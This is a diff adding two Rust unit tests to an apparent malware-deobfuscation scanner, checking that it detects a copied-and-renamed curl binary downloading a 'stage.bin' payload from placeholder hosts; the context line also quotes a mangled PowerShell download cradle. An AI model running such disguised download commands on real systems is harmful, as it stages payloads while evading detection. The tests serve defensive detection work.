@@ -14352,6 +14352,58 @@ powershll.exe -mmand"(Nw-ject-ypame Sstem.Net.Welint).Dwnloadile('https://raw.ex
     }
 
     #[test]
+    fn copied_curl_alias_url_before_output_preserves_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
+            src: "c:\\windows\\system32\\curl.exe".to_string(),
+            dst: "vjik.exe".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"vjik --URL https://curl-copy-any-order.example/stage.bin --OUTPUT C:\Temp\stage.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-copy-any-order.example/stage.bin"
+                        && dst.as_deref() == Some(r#"C:\Temp\stage.bin"#)
+            )
+        });
+        assert!(
+            has,
+            "copied curl alias did not preserve any-order destination: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
+    fn copied_curl_alias_attached_uppercase_output_preserves_destination() {
+        let mut env = crate::env::Environment::new(&Config::default());
+        env.traits.push(Trait::WindowsUtilManip {
+            cmd: "copy c:\\windows\\system32\\curl.exe vjik.exe".to_string(),
+            src: "c:\\windows\\system32\\curl.exe".to_string(),
+            dst: "vjik.exe".to_string(),
+        });
+        crate::deob_scan::scan_deob_text(
+            r#"vjik --URL=https://curl-copy-attached-output.example/stage.bin --OUTPUT=C:\Temp\stage.bin"#,
+            &mut env,
+        );
+        let has = env.traits.iter().any(|t| {
+            matches!(t,
+                Trait::Download { src, dst, .. }
+                    if src == "https://curl-copy-attached-output.example/stage.bin"
+                        && dst.as_deref() == Some(r#"C:\Temp\stage.bin"#)
+            )
+        });
+        assert!(
+            has,
+            "copied curl alias did not preserve attached uppercase output: {:?}",
+            env.traits
+        );
+    }
+
+    #[test]
     fn copied_curl_alias_schemeless_in_deob_text_emits_structured_download() {
         let mut env = crate::env::Environment::new(&Config::default());
         env.traits.push(Trait::WindowsUtilManip {
